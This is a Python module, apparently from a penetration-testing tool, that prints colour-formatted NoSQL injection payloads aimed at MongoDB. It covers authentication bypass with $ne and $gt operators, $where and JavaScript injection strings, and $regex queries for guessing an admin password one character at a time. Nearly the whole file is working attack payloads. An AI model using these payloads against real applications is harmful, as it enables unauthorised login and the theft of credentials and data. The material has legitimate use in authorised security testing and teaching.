from colorama import Fore
from .. import date
from urllib.parse import quote
import requests, urllib3, string, sys, time

def auth_bypass():
    print("\n" + date.INFO() + "Authentication Bypass Payloads:\n")
    print(Fore.WHITE + '''{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$ne"''' + Fore.WHITE + ''':''' + Fore.BLUE + ''' null''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE +''': {''' + Fore.GREEN + '''"$ne"''' + Fore.WHITE + ''':''' + Fore.BLUE + ''' null''' + Fore.WHITE + '''}}
{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$ne"''' + Fore.WHITE + ''': ''' + Fore.CYAN + '''"foo"''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$ne"''' + Fore.WHITE + ''':''' + Fore.CYAN + ''' "bar"''' + Fore.WHITE + '''}}
{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$gt"''' + Fore.WHITE + ''':''' + Fore.RED + ''' undefined''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$gt"''' + Fore.WHITE + ''': ''' + Fore.RED + '''undefined''' + Fore.WHITE + '''}}
{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$gt"''' + Fore.WHITE + ''':''' + Fore.CYAN + '''""''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$gt"''' + Fore.WHITE + ''':''' + Fore.CYAN + '''""''' + Fore.WHITE + '''}}''')

def mongodb():
    print("\n" + date.INFO() + "MongoDB Payloads:\n")
    print('''true, $where: ''' + Fore.CYAN + '''\'1 == 1\'''' + Fore.WHITE + '''
, $where: ''' + Fore.CYAN + '''\'1 == 1\'''' + Fore.WHITE + '''
$where: ''' + Fore.CYAN + '''\'1 == 1\'
\', $where: \'''' + Fore.WHITE + '''1 == 1''' + Fore.CYAN + '''\'
1, $where: \'''' + Fore.WHITE + '''1 == 1''' + Fore.CYAN + '''\'
{ $ne: 1 }
\'''' + Fore.WHITE + ''', $or: [ {}, { ''' + Fore.CYAN + '''\'a\'''' + Fore.WHITE + ''':''' + Fore.CYAN + '''\'a
\'''' + Fore.WHITE + ''' } ], $comment:''' + Fore.CYAN + '''\'successful MongoDB injection\'''' + Fore.WHITE + '''
db.injection.insert({success:1})''' + Fore.RED + ''';''' + Fore.WHITE + '''
db.injection.insert({success:1})''' + Fore.RED + ''';return''' + Fore.MAGENTA + ''' 1;db.stores.mapReduce(function''' + Fore.WHITE + '''() { { emit(1,1
''' + Fore.RED + '''||''' + Fore.WHITE + ''' 1==1
''' + Fore.CYAN + '''\' && this.password.match(/.*/)//+%00
\'''' + Fore.RED + ''' &&''' + Fore.WHITE + ''' this.passwordzz.match(/.''' + Fore.RED + '''*''' + Fore.WHITE + '''/)//+%00
''' + Fore.CYAN + '''\'%20%26%26%20this.password.match(/.*/)//+%00
\'''' + Fore.WHITE + '''%20%26%26%20this.passwordzz.match(/.''' + Fore.RED + '''*''' + Fore.WHITE + '''/)//+%00
{$gt: ''' + Fore.CYAN + '''\'\'''' + Fore.WHITE + '''}
[$ne]=1
''' + Fore.CYAN + '''\';return \''''+ Fore.WHITE + '''a''' + Fore.CYAN + '''\'==\'''' + Fore.WHITE + '''a''' + Fore.CYAN + '''\' && \'\'==\'
";return(true);var xyz=\'a
0;return true''' + Fore.WHITE)

def extract_data():
    print("\n" + date.INFO() + "Extract data Payloads:\n")
    print('''{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$eq"''' + Fore.WHITE + ''':''' + Fore.GREEN + ''' "admin"''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$regex"''' + Fore.WHITE + ''': ''' + Fore.GREEN + '''"^m"''' + Fore.WHITE + ''' }}
{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$eq"''' + Fore.WHITE + ''':''' + Fore.GREEN + ''' "admin"''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$regex"''' + Fore.WHITE + ''':''' + Fore.GREEN + ''' "^md"''' + Fore.WHITE + ''' }}
{''' + Fore.GREEN + '''"username"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$eq"''' + Fore.WHITE + ''':''' + Fore.GREEN + ''' "admin"''' + Fore.WHITE + '''},''' + Fore.GREEN + ''' "password"''' + Fore.WHITE + ''': {''' + Fore.GREEN + '''"$regex"''' + Fore.WHITE + ''':''' + Fore.GREEN + ''' "^mdp"''' + Fore.WHITE + ''' }}''')